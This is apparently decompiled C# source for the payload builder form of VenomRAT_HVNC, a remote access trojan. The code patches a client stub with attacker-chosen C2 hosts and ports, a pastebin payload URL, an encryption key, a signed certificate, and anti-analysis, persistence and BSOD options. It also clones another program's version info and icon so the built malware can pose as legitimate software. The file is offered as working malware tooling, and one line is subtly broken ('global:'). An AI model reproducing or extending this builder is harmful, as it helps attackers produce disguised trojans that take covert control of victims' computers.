using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Guna.UI2.WinForms;
using Toolbelt.Drawing;
using VenomRAT_HVNC.Server.Algorithm;
using VenomRAT_HVNC.Server.Helper;
using Vestris.ResourceLib;

namespace VenomRAT_HVNC.Server.Forms
{
    // Token: 0x0200007A RID: 122
    public partial class FormBuilder
    {
        // Token: 0x06000470 RID: 1136 RVA: 0x0002BBE8 File Offset: 0x0002BBE8
        public FormBuilder()
        {
            InitializeComponent();
        }

        // Token: 0x06000471 RID: 1137 RVA: 0x0002BC04 File Offset: 0x0002BC04
        private void SaveSettings()
        {
            try
            {
                List<string> list = new List<string>();
                foreach (object obj in this.YourListPorts.Items)
                {
                    string item = (string)obj;
                    list.Add(item);
                }
            global: VenomRAT_HVNC.Server.Properties.Settings.Default.Ports = string.Join(",", list);
                List<string> list2 = new List<string>();
                foreach (object obj2 in this.YourListIPs.Items)
                {
                    string item2 = (string)obj2;
                    list2.Add(item2);
                }
                global::VenomRAT_HVNC.Server.Properties.Settings.Default.IP = string.Join(",", list2);
                global::VenomRAT_HVNC.Server.Properties.Settings.Default.Save();
            }
            catch
            {
            }
        }

        // Token: 0x06000472 RID: 1138 RVA: 0x0002BD0C File Offset: 0x0002BD0C
        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (this.checkBox1.Checked)
            {
                this.checkBox1.Text = "ON";
                this.textFilename.Enabled = true;
                this.comboBoxFolder.Enabled = true;
                return;
            }
            this.checkBox1.Text = "OFF";
            this.textFilename.Enabled = false;
            this.comboBoxFolder.Enabled = false;
        }

        // Token: 0x06000473 RID: 1139 RVA: 0x0002BD78 File Offset: 0x0002BD78
        private void Builder_Load(object sender, EventArgs e)
        {
            this.comboBoxFolder.SelectedIndex = 0;
            if (global::VenomRAT_HVNC.Server.Properties.Settings.Default.IP.Length == 0)
            {
                this.YourListIPs.Items.Add("127.0.0.1");
            }
            if (global::VenomRAT_HVNC.Server.Properties.Settings.Default.Paste_bin.Length == 0)
            {
                this.txtPaste_bin.Text = "Paste Your Payload URL";
            }
            try
            {
                string[] array = global::VenomRAT_HVNC.Server.Properties.Settings.Default.Ports.Split(new string[] { "," }, StringSplitOptions.None);
                foreach (string text in array)
                {
                    if (!string.IsNullOrWhiteSpace(text))
                    {
                        this.YourListPorts.Items.Add(text.Trim());
                    }
                }
            }
            catch
            {
            }
            try
            {
                string[] array3 = global::VenomRAT_HVNC.Server.Properties.Settings.Default.IP.Split(new string[] { "," }, StringSplitOptions.None);
                foreach (string text2 in array3)
                {
                    if (!string.IsNullOrWhiteSpace(text2))
                    {
                        this.YourListIPs.Items.Add(text2.Trim());
                    }
                }
            }
            catch
            {
            }
            if (global::VenomRAT_HVNC.Server.Properties.Settings.Default.Mutex.Length == 0)
            {
                this.txtMutex.Text = this.getRandomCharacters();
            }
        }

        // Token: 0x06000474 RID: 1140 RVA: 0x0002BED4 File Offset: 0x0002BED4
        private void CheckBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (this.chkPaste_bin.Checked)
            {
                this.txtPaste_bin.Enabled = true;
                this.textIP.Enabled = false;
                this.textPort.Enabled = false;
                this.YourListIPs.Enabled = false;
                this.YourListPorts.Enabled = false;
                this.btnAddIP.Enabled = false;
                this.btnAddPort.Enabled = false;
                this.btnRemoveIP.Enabled = false;
                this.btnRemovePort.Enabled = false;
                return;
            }
            this.txtPaste_bin.Enabled = false;
            this.textIP.Enabled = true;
            this.textPort.Enabled = true;
            this.YourListIPs.Enabled = true;
            this.YourListPorts.Enabled = true;
            this.btnAddIP.Enabled = true;
            this.btnAddPort.Enabled = true;
            this.btnRemoveIP.Enabled = true;
            this.btnRemovePort.Enabled = true;
        }

        // Token: 0x06000475 RID: 1141 RVA: 0x0002BFC7 File Offset: 0x0002BFC7
        private void BtnRemovePort_Click(object sender, EventArgs e)
        {
            if (this.YourListPorts.SelectedItems.Count == 1)
            {
                this.YourListPorts.Items.Remove(this.YourListPorts.SelectedItem);
            }
        }

        // Token: 0x06000476 RID: 1142 RVA: 0x0002BFF8 File Offset: 0x0002BFF8
        private void BtnAddPort_Click(object sender, EventArgs e)
        {
            try
            {
                Convert.ToInt32(this.textPort.Text.Trim());
                foreach (object obj in this.YourListPorts.Items)
                {
                    string text = (string)obj;
                    if (text.Equals(this.textPort.Text.Trim()))
                    {
                        return;
                    }
                }
                this.YourListPorts.Items.Add(this.textPort.Text.Trim());
                this.textPort.Clear();
            }
            catch
            {
            }
        }

        // Token: 0x06000477 RID: 1143 RVA: 0x0002C0BC File Offset: 0x0002C0BC
        private void BtnRemoveIP_Click(object sender, EventArgs e)
        {
            if (this.YourListIPs.SelectedItems.Count == 1)
            {
                this.YourListIPs.Items.Remove(this.YourListIPs.SelectedItem);
            }
        }

        // Token: 0x06000478 RID: 1144 RVA: 0x0002C0EC File Offset: 0x0002C0EC
        private void BtnAddIP_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (object obj in this.YourListIPs.Items)
                {
                    string text = (string)obj;
                    this.textIP.Text = this.textIP.Text.Replace(" ", "");
                    if (text.Equals(this.textIP.Text))
                    {
                        return;
                    }
                }
                this.YourListIPs.Items.Add(this.textIP.Text.Replace(" ", ""));
                this.textIP.Clear();
            }
            catch
            {
            }
        }

        // Token: 0x06000479 RID: 1145 RVA: 0x0002C1C4 File Offset: 0x0002C1C4
        private async void BtnBuild_Click(object sender, EventArgs e)
        {
            if ((this.chkPaste_bin.Checked || this.YourListIPs.Items.Count != 0) && this.YourListPorts.Items.Count != 0)
            {
                if (this.checkBox1.Checked)
                {
                    if (string.IsNullOrWhiteSpace(this.textFilename.Text) || string.IsNullOrWhiteSpace(this.comboBoxFolder.Text))
                    {
                        return;
                    }
                    if (!this.textFilename.Text.EndsWith("exe"))
                    {
                        Guna2TextBox guna2TextBox = this.textFilename;
                        guna2TextBox.Text += ".exe";
                    }
                }
                if (string.IsNullOrWhiteSpace(this.txtMutex.Text))
                {
                    this.txtMutex.Text = this.getRandomCharacters();
                }
                if (!this.chkPaste_bin.Checked || !string.IsNullOrWhiteSpace(this.txtPaste_bin.Text))
                {
                    ModuleDefMD val = null;
                    try
                    {
                        ModuleDefMD val2 = val = ModuleDefMD.Load("Stub/Client.exe", (ModuleCreationOptions)null);
                        try
                        {
                            using SaveFileDialog saveFileDialog = new SaveFileDialog();
                            saveFileDialog.Filter = ".exe (*.exe)|*.exe";
                            saveFileDialog.InitialDirectory = Application.StartupPath;
                            saveFileDialog.OverwritePrompt = false;
                            saveFileDialog.FileName = "Client";
                            if (saveFileDialog.ShowDialog() == DialogResult.OK)
                            {
                                btnBuild.Enabled = false;
                                WriteSettings(val, saveFileDialog.FileName);
                                ((ModuleDef)val).Write(saveFileDialog.FileName);
                                ((ModuleDef)val).Dispose();
                                if (btnAssembly.Checked)
                                {
                                    WriteAssembly(saveFileDialog.FileName);
                                }
                                if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
                                {
                                    IconInjector.InjectIcon(saveFileDialog.FileName, txtIcon.Text);
                                }
                                MessageBox.Show("Stub Successfully build!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                                SaveSettings();
                                Close();
                            }
                        }
                        finally
                        {
                            ((IDisposable)val2)?.Dispose();
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                        if (val != null)
                        {
                            val.Dispose();
                        }
                        btnBuild.Enabled = true;
                    }
                }
            }
        }

        // Token: 0x0600047A RID: 1146 RVA: 0x0002C1FC File Offset: 0x0002C1FC
        private void WriteAssembly(string filename)
        {
            try
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(filename);
                versionResource.FileVersion = this.txtFileVersion.Text;
                versionResource.ProductVersion = this.txtProductVersion.Text;
                versionResource.Language = 0;
                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["ProductName"] = this.txtProduct.Text;
                stringFileInfo["FileDescription"] = this.txtDescription.Text;
                stringFileInfo["CompanyName"] = this.txtCompany.Text;
                stringFileInfo["LegalCopyright"] = this.txtCopyright.Text;
                stringFileInfo["LegalTrademarks"] = this.txtTrademarks.Text;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = this.txtOriginalFilename.Text;
                stringFileInfo["OriginalFilename"] = this.txtOriginalFilename.Text;
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;
                versionResource.SaveTo(filename);
            }
            catch (Exception ex)
            {
                throw new ArgumentException("Assembly: " + ex.Message);
            }
        }

        // Token: 0x0600047B RID: 1147 RVA: 0x0002C35C File Offset: 0x0002C35C
        private void BtnAssembly_CheckedChanged(object sender, EventArgs e)
        {
            if (this.btnAssembly.Checked)
            {
                this.btnClone.Enabled = true;
                this.txtProduct.Enabled = true;
                this.txtDescription.Enabled = true;
                this.txtCompany.Enabled = true;
                this.txtCopyright.Enabled = true;
                this.txtTrademarks.Enabled = true;
                this.txtOriginalFilename.Enabled = true;
                this.txtOriginalFilename.Enabled = true;
                this.txtProductVersion.Enabled = true;
                this.txtFileVersion.Enabled = true;
                return;
            }
            this.btnClone.Enabled = false;
            this.txtProduct.Enabled = false;
            this.txtDescription.Enabled = false;
            this.txtCompany.Enabled = false;
            this.txtCopyright.Enabled = false;
            this.txtTrademarks.Enabled = false;
            this.txtOriginalFilename.Enabled = false;
            this.txtOriginalFilename.Enabled = false;
            this.txtProductVersion.Enabled = false;
            this.txtFileVersion.Enabled = false;
        }

        // Token: 0x0600047C RID: 1148 RVA: 0x000067A9 File Offset: 0x000067A9
        private void ChkIcon_CheckedChanged(object sender, EventArgs e)
        {
        }

        // Token: 0x0600047D RID: 1149 RVA: 0x0002C468 File Offset: 0x0002C468
        private void BtnIcon_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "Choose Icon";
                openFileDialog.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
                openFileDialog.Multiselect = false;
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    if (openFileDialog.FileName.ToLower().EndsWith(".exe"))
                    {
                        string icon = this.GetIcon(openFileDialog.FileName);
                        this.txtIcon.Text = icon;
                        this.picIcon.ImageLocation = icon;
                    }
                    else
                    {
                        this.txtIcon.Text = openFileDialog.FileName;
                        this.picIcon.ImageLocation = openFileDialog.FileName;
                    }
                }
            }
        }

        // Token: 0x0600047E RID: 1150 RVA: 0x0002C520 File Offset: 0x0002C520
        private string GetIcon(string path)
        {
            try
            {
                string text = Path.GetTempFileName() + ".ico";
                using (FileStream fileStream = new FileStream(text, FileMode.Create))
                {
                    IconExtractor.Extract1stIconTo(path, fileStream);
                }
                return text;
            }
            catch
            {
            }
            return "";
        }

        // Token: 0x0600047F RID: 1151 RVA: 0x0002C584 File Offset: 0x0002C584
        private void WriteSettings(ModuleDefMD asmDef, string AsmName)
        {
            try
            {
                string randomString = Methods.GetRandomString(32);
                Aes256 aes = new Aes256(randomString);
                X509Certificate2 x509Certificate = new X509Certificate2(global::VenomRAT_HVNC.Server.Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
                X509Certificate2 x509Certificate2 = new X509Certificate2(x509Certificate.Export(X509ContentType.Cert));
                byte[] inArray;
                using (RSACryptoServiceProvider rsacryptoServiceProvider = (RSACryptoServiceProvider)x509Certificate.PrivateKey)
                {
                    byte[] rgbHash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(randomString));
                    inArray = rsacryptoServiceProvider.SignHash(rgbHash, CryptoConfig.MapNameToOID("SHA256"));
                }
                foreach (TypeDef typeDef in asmDef.Types)
                {
                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                    asmDef.Name = Path.GetFileName(AsmName);
                    if (typeDef.Name == "Settings")
                    {
                        foreach (MethodDef methodDef in typeDef.Methods)
                        {
                            if (methodDef.Body != null)
                            {
                                for (int i = 0; i < methodDef.Body.Instructions.Count<Instruction>(); i++)
                                {
                                    if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                    {
                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Ports%")
                                        {
                                            if (this.chkPaste_bin.Enabled && this.chkPaste_bin.Checked)
                                            {
                                                methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
                                            }
                                            else
                                            {
                                                List<string> list = new List<string>();
                                                foreach (object obj in this.YourListPorts.Items)
                                                {
                                                    string item = (string)obj;
                                                    list.Add(item);
                                                }
                                                methodDef.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", list));
                                            }
                                        }
                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Hosts%")
                                        {
                                            if (this.chkPaste_bin.Enabled && this.chkPaste_bin.Checked)
                                            {
                                                methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
                                            }
                                            else
                                            {
                                                List<string> list2 = new List<string>();
                                                foreach (object obj2 in this.YourListIPs.Items)
                                                {
                                                    string item2 = (string)obj2;
                                                    list2.Add(item2);
                                                }
                                                methodDef.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", list2));
                                            }
                                        }
                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Install%")
                                        {
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.checkBox1.Checked.ToString().ToLower());
                                        }
                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Folder%")
                                        {
                                            methodDef.Body.Instructions[i].Operand = this.comboBoxFolder.Text;
                                        }
                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%File%")
                                        {
                                            methodDef.Body.Instructions[i].Operand = this.textFilename.Text;
                                        }
                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Version%")
                                        {
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(global::VenomRAT_HVNC.Server.Settings.Version.Replace("DcRat ", ""));
                                        }
                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Key%")
                                        {
                                            methodDef.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(randomString));
                                        }
                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%MTX%")
                                        {
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.txtMutex.Text);
                                        }
                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Anti%")
                                        {
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.chkAnti.Checked.ToString().ToLower());
                                        }
                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%AntiProcess%")
                                        {
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.chkAntiProcess.Checked.ToString().ToLower());
                                        }
                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Certificate%")
                                        {
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(x509Certificate2.Export(X509ContentType.Cert)));
                                        }
                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Serversignature%")
                                        {
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(inArray));
                                        }
                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%BSOD%")
                                        {
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.chkBsod.Checked.ToString().ToLower());
                                        }
                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Paste_bin%")
                                        {
                                            if (this.chkPaste_bin.Checked)
                                            {
                                                methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.txtPaste_bin.Text);
                                            }
                                            else
                                            {
                                                methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
                                            }
                                        }
                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Delay%")
                                        {
                                            methodDef.Body.Instructions[i].Operand = this.numDelay.Value.ToString();
                                        }
                                        if (methodDef.Body.Instructions[i].Operand.ToString() == "%Group%")
                                        {
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.txtGroup.Text);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                throw new ArgumentException("WriteSettings: " + ex.Message);
            }
        }

        // Token: 0x06000480 RID: 1152 RVA: 0x0002CE5C File Offset: 0x0002CE5C
        public string getRandomCharacters()
        {
            StringBuilder stringBuilder = new StringBuilder();
            for (int i = 1; i <= new Random().Next(10, 20); i++)
            {
                int index = this.random.Next(0, "asdfghjklqwertyuiopmnbvcxz".Length);
                stringBuilder.Append("asdfghjklqwertyuiopmnbvcxz"[index]);
            }
            return stringBuilder.ToString();
        }

        // Token: 0x06000481 RID: 1153 RVA: 0x0002CEB8 File Offset: 0x0002CEB8
        private void BtnClone_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable (*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
                    this.txtOriginalFilename.Text = versionInfo.InternalName ?? string.Empty;
                    this.txtDescription.Text = versionInfo.FileDescription ?? string.Empty;
                    this.txtCompany.Text = versionInfo.CompanyName ?? string.Empty;
                    this.txtProduct.Text = versionInfo.ProductName ?? string.Empty;
                    this.txtCopyright.Text = versionInfo.LegalCopyright ?? string.Empty;
                    this.txtTrademarks.Text = versionInfo.LegalTrademarks ?? string.Empty;
                    int fileMajorPart = versionInfo.FileMajorPart;
                    this.txtFileVersion.Text = string.Concat(new string[]
                    {
                        versionInfo.FileMajorPart.ToString(),
                        ".",
                        versionInfo.FileMinorPart.ToString(),
                        ".",
                        versionInfo.FileBuildPart.ToString(),
                        ".",
                        versionInfo.FilePrivatePart.ToString()
                    });
                    this.txtProductVersion.Text = string.Concat(new string[]
                    {
                        versionInfo.FileMajorPart.ToString(),
                        ".",
                        versionInfo.FileMinorPart.ToString(),
                        ".",
                        versionInfo.FileBuildPart.ToString(),
                        ".",
                        versionInfo.FilePrivatePart.ToString()
                    });
                }
            }
        }

        // Token: 0x06000482 RID: 1154 RVA: 0x000067A9 File Offset: 0x000067A9
        private void btnShellcode_Click(object sender, EventArgs e)
        {
        }

        // Token: 0x06000483 RID: 1155 RVA: 0x000067A9 File Offset: 0x000067A9
        private void guna2ShadowPanel1_Paint(object sender, PaintEventArgs e)
        {
        }

        // Token: 0x06000484 RID: 1156 RVA: 0x000067A9 File Offset: 0x000067A9
        private void guna2ShadowPanel2_Paint(object sender, PaintEventArgs e)
        {
        }

        // Token: 0x0400038F RID: 911
        private readonly Random random = new Random();

        // Token: 0x04000390 RID: 912
        private const string alphabet = "asdfghjklqwertyuiopmnbvcxz";
    }
}